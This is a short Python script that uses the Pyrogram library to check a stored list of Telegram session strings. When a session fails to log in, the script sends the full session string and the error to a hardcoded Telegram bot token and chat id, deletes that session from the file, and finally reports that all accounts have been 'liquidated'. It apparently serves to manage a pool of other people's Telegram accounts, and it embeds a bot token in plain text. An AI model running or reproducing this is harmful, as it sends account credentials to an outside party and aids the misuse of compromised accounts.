import json
import requests
import sys
from pyrogram.raw import functions, types
from pyrogram import Client, idle
from pyrogram.types import Message
import os
import re
from time import sleep, strftime 

def perform_check(user, session_string):
    try:
           sleep(0.1)
           app = Client(
            "usersession",
            session_string=session_string)
           app.start()
    except Exception as e:
        	y = requests.post(f"https://api.telegram.org/bot5457172701:AAHS018G05gE2yrrHUv6CO5iaLE9HACsgL0/sendmessage?chat_id=5679320939&text=The session has been deleted from storage :⚠️\n {session_string}\n- - - - -\nbecause of : 🔔\n {e}")
        	with open('session.json', 'r') as file:
        	               	data = json.load(file)
        	               	if session_string in data['session']:
        	               		data['session'].remove(session_string)
        	               		with open('session.json', 'w') as file:
        	               			json.dump(data, file)
                    

with open('session.json') as g:
    data = json.load(g)
    users = data['session']

qq = 0
with open('session.json', 'r') as b:
 user = b.read()
count = len(users)
id = '15551290'
i = 0
while True:
    session_string = users[i]
    perform_check(user, session_string)
    qq += 1
    i += 1
    if i >= count:
    	y = requests.post(f"https://api.telegram.org/bot5457172701:AAHS018G05gE2yrrHUv6CO5iaLE9HACsgL0/sendmessage?chat_id=5679320939&text=All accounts have been liquidated ✅")
    	exit()